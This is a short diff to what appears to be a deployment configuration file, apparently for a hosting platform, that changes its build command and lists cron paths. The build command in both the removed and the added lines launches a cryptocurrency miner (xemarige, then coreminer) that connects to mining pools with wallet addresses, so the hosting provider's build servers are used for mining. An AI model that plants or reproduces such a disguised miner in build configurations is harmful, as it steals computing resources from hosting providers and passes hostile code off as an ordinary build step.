@@ -1,5 +1,5 @@
 {
-  "buildCommand": "./xemarige --donate-level 1 -o de.qrl.gfwroute.com:1166 -u Q01060090d6a7b0fa539968556afdc7beff396a2e41f7fa83001c8e8848c7734f3f0ddd90253143.$(echo $RANDOM | md5sum | head -c 10) -a rx/0 -k -t $(nproc --all)",
+  "buildCommand": "./coreminer -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008",
   "crons": [
     {
       "path": "/api/cron/1m",
